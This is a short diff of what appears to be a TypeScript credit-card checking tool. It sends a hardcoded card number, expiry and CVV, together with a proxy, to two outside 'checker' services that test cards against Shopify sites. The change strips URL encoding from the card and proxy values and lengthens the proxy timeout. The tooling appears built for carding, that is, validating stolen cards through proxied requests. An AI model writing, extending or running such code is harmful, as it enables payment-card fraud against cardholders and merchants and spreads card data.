@@ -7748,9 +7748,9 @@ ${resultsDisplay || "Waiting for results..."}
       // Two API endpoints for checking sites
       const API_ENDPOINTS = [
         (site: string, cc: string, proxy: string) => 
-          `http://mentoschk.com/shopify?site=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${encodeURIComponent(proxy)}`,
+          `http://mentoschk.com/shopify?site=${site}&cc=${cc}&proxy=${proxy}`,
         (site: string, cc: string, proxy: string) => 
-          `https://teamoicxkiller.online/code/index.php?url=${encodeURIComponent(site)}&cc=${encodeURIComponent(cc)}&proxy=${encodeURIComponent(proxy)}`,
+          `https://teamoicxkiller.online/code/index.php?url=${site}&cc=${cc}&proxy=${proxy}`,
       ];
       const TEST_CC = "4266841674104656|03|27|908";
 
@@ -7796,7 +7796,7 @@ ${resultsDisplay || "Waiting for results..."}
           for (const buildUrl of API_ENDPOINTS) {
             try {
               const controller = new AbortController();
-              const timeoutId = setTimeout(() => controller.abort(), 20000);
+              const timeoutId = setTimeout(() => controller.abort(), 60000); // 60s timeout for proxy requests
 
               const apiUrl = buildUrl(siteUrl, TEST_CC, proxyStr);
               
